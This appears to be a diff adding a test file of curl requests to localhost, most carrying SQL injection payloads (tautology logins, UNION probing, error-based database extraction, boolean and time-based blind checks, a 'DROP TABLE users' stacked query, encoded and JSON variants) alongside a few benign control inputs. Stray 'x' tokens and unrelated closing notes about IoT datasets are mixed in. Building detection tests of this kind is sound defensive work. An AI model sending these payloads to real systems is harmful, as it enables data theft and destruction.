@@ -1,0 +1,45 @@
+curl -v "http://localhost/index.php?user=alice&id=123"
+
+curl -v -X POST -d "username=alice&comment=hello+world" "http://localhost/index.php"
+
+curl -v "http://localhost/index.php?id=1' OR '1'='1"
+
+curl -v --path-as-is "http://localhost/index.php?id=1%27%20OR%20%271%27%3D%271"
+
+curl -v -X POST -d "username=admin' -- &password=xxx" "http://localhost/login.php" x
+
+curl -v "http://localhost/index.php?id=1 UNION SELECT NULL-- "
+
+curl -v "http://localhost/index.php?id=1 UNION SELECT NULL,NULL-- "
+curl -v "http://localhost/index.php?id=1 UNION SELECT NULL,NULL,NULL-- "
+
+curl -v "http://localhost/index.php?id=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -"
+
+curl -v "http://localhost/index.php?id=1 AND 1=1"
+
+curl -v "http://localhost/index.php?id=1 AND 1=2"
+
+curl -v --path-as-is "http://localhost/index.php?id=1 AND SLEEP(5)-- "
+
+curl -v -X POST -d "id=1 AND SLEEP(5)-- " "http://localhost/index.php"
+
+curl -v "http://localhost/index.php?id=1; DROP TABLE users; -- "
+
+curl -v --path-as-is "http://localhost/index.php?q=%2527%20OR%2520%25271%2527%3D%25271" x
+
+curl -v --path-as-is "http://localhost/index.php?id=1%20AND%20SLEEP(3)--%20"
+
+curl -v -X POST -H "Content-Type: application/json" -d '{"username":"admin\" OR \"1\"=\"1","password":"x"}' "http://localhost/api/login" x
+
+long=$(head /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 1200)
+curl -v "http://localhost/search.php?q=$long"
+
+curl -v --path-as-is "http://localhost/index.php?note=$(printf 'A%.0s' {1..500})' OR '1'='1"
+
+curl -v -X POST -d "comment=I use SELECT in my notes but not executing SQL" "http://localhost/post.php"
+
+curl -v "http://localhost/index.php?note=I_will_sleep_now_and_read_cat_foods"
+
+the bot iot net
+
+Bộ dữ liệu IOT 23
